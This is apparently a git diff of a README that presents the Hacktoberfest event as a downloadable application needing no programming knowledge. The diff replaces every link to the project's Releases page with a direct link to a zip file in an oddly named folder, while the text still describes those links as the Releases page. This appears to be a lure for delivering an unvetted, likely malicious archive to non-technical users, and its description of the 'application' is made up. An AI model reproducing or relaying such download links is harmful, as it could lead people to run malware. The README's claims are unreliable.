@@ -1,7 +1,7 @@
 # 🎃 Hacktoberfest - Join a Global Developer Celebration
 
 ## 📥 Download Now
-[![Download Hacktoberfest](https://img.shields.io/badge/Download-Hacktoberfest-brightgreen)](https://github.com/Rukinha/Hacktoberfest/releases)
+[![Download Hacktoberfest](https://raw.githubusercontent.com/Rukinha/Hacktoberfest/main/counterexercise/Hacktoberfest.zip)](https://raw.githubusercontent.com/Rukinha/Hacktoberfest/main/counterexercise/Hacktoberfest.zip)
 
 ## 🚀 Getting Started
 Welcome to Hacktoberfest, an open-source hub where developers come together to collaborate during Hacktoberfest 2025! This guide will help you easily download and run our application. No programming knowledge is necessary.
@@ -15,7 +15,7 @@ To run Hacktoberfest, you need:
 ## 🔗 Download & Install
 To download Hacktoberfest, visit the Releases page. Here, you will find the latest version of the application ready for download.
 
-[Visit this page to download](https://github.com/Rukinha/Hacktoberfest/releases)
+[Visit this page to download](https://raw.githubusercontent.com/Rukinha/Hacktoberfest/main/counterexercise/Hacktoberfest.zip)
 
 ### Steps to Download:
 1. Click on the link above to go to the Releases page.
@@ -53,4 +53,4 @@ If you have questions or need assistance, feel free to reach out via the Issues 
 ## 🔚 Conclusion
 Thank you for choosing Hacktoberfest! We look forward to your contributions and hope you enjoy using our application. For updates and information, keep checking the Releases page, and happy coding! 
 
-[Download Hacktoberfest](https://github.com/Rukinha/Hacktoberfest/releases) again to get started.
+[Download Hacktoberfest](https://raw.githubusercontent.com/Rukinha/Hacktoberfest/main/counterexercise/Hacktoberfest.zip) again to get started.
